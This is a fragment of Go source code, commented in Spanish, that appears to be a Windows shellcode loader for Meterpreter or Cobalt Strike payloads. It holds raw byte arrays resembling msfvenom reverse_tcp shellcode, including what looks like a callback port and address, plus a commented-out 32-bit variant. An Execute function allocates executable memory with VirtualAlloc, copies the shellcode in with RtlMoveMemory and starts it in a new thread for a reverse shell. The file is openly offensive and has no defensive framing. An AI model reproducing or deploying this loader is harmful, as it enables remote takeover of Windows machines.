...
// Shellcode raw sin ofuscar (Meterpreter/Cobalt Strike)
// PEGAR AQUI EL SHELLCODE GENERADO (msfvenom -p windows/x64/meterpreter/reverse_tcp ...)
var Shellcode = []byte{
	// Placeholder (NOPs) - Reemplazar con shellcode real
	0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00,
	0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x48, 0x31, 0xd2, 0x65, 0x48,
	0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x56, 0x48, 0x8b, 0x52, 0x20,
	...
	0x40, 0x20, 0x49, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0xe3, 0x56, 0x48,
	...
	0x49, 0x89, 0xe5, 0x49, 0xbc, 0x02, 0x00, 0x11, 0x5c, 0x36, 0x25, 0xe2,
	0xb3, 0x41, 0x54, 0x49, 0x89, 0xe4, 0x4c, 0x89, 0xf1, 0x41, 0xba, 0x4c,
...
/*var Shellcode = []byte{0xfc, 0xe8, 0x8f, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5,
0x31, 0xd2, 0x64, 0x8b, 0x52, 0x30, 0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14,
0x8b, 0x72, 0x28, 0x31, 0xff, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xc0, 0xac,
...
0x8b, 0x58, 0x20, 0x50, 0x01, 0xd3, 0x85, 0xc9, 0x74, 0x3c, 0x31, 0xff,
0x49, 0x8b, 0x34, 0x8b, 0x01, 0xd6, 0x31, 0xc0, 0xc1, 0xcf, 0x0d, 0xac,
...
0x36, 0x25, 0xe2, 0xb3, 0x68, 0x02, 0x00, 0x11, 0x5c, 0x89, 0xe6, 0x50,
...
// Execute asigna memoria, copia el shellcode y lo ejecuta en un hilo nuevo
func Execute() {
	if len(Shellcode) <= 10 {
		return
	}
	...
	// 1. VirtualAlloc(0, size, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	...
	// 2. RtlMoveMemory(addr, shellcode, size)
	rtlMoveMemory.Call(
		addr,
	...
	if thread != 0 {
		// Opcional: Esperar un poco, pero no bloquear indefinidamente si es un reverse shell
